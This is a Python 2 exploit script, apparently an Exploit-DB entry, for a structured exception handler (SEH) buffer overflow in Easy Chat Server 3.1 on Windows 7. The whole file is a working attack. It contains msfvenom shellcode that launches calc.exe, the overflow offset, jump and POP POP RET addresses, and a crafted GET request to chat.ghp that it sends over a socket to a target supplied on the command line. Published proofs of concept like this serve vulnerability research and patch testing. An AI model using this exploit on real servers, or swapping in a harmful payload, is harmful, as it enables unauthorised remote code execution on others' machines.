#!/usr/bin/env python2

# Exploit Title: Easy Chat Server 3.1 SEH OVerflow (no DEP, no ASLR)
# Date: 02/17/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : N/A

import socket
import sys
import logging

offset=217

# msfvenom -p windows/exec cmd=calc.exe -b "\x0a\x00\x0d\x20" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbe\x8d\xe7\xa4\x97\xdb\xdb\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x31\x83\xef\xfc\x31\x77\x0f"
shellcode += b"\x03\x77\x82\x05\x51\x6b\x74\x4b\x9a\x94\x84"
shellcode += b"\x2c\x12\x71\xb5\x6c\x40\xf1\xe5\x5c\x02\x57"
shellcode += b"\x09\x16\x46\x4c\x9a\x5a\x4f\x63\x2b\xd0\xa9"
shellcode += b"\x4a\xac\x49\x89\xcd\x2e\x90\xde\x2d\x0f\x5b"
shellcode += b"\x13\x2f\x48\x86\xde\x7d\x01\xcc\x4d\x92\x26"
shellcode += b"\x98\x4d\x19\x74\x0c\xd6\xfe\xcc\x2f\xf7\x50"
shellcode += b"\x47\x76\xd7\x53\x84\x02\x5e\x4c\xc9\x2f\x28"
shellcode += b"\xe7\x39\xdb\xab\x21\x70\x24\x07\x0c\xbd\xd7"
shellcode += b"\x59\x48\x79\x08\x2c\xa0\x7a\xb5\x37\x77\x01"
shellcode += b"\x61\xbd\x6c\xa1\xe2\x65\x49\x50\x26\xf3\x1a"
shellcode += b"\x5e\x83\x77\x44\x42\x12\x5b\xfe\x7e\x9f\x5a"
shellcode += b"\xd1\xf7\xdb\x78\xf5\x5c\xbf\xe1\xac\x38\x6e"
shellcode += b"\x1d\xae\xe3\xcf\xbb\xa4\x09\x1b\xb6\xe6\x47"
shellcode += b"\xda\x44\x9d\x25\xdc\x56\x9e\x19\xb5\x67\x15"
shellcode += b"\xf6\xc2\x77\xfc\xb3\x3d\x32\x5d\x95\xd5\x9b"
shellcode += b"\x37\xa4\xbb\x1b\xe2\xea\xc5\x9f\x07\x92\x31"
shellcode += b"\xbf\x6d\x97\x7e\x07\x9d\xe5\xef\xe2\xa1\x5a"
shellcode += b"\x0f\x27\xc2\x3d\x83\xab\x2b\xd8\x23\x49\x34"

buf = 'GET /chat.ghp?username='
buf += "A"*offset		# Reach SEH on the stack
buf += "\xeb\x06\x90\x90"	# jmp 
buf += "\x35\x3b\x01\x10"	# SEH POP POP RET (no-ASLR library is available)
buf += shellcode
buf += "B"*3000
buf += '&password='
buf += 'test&room=1&sex=1 HTTP/1.1\r\n\r\n'
buf += 'Host: 127.0.0.1\r\n\r\n' 


if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

s.send(buf)
output = s.recv(1024)
print output

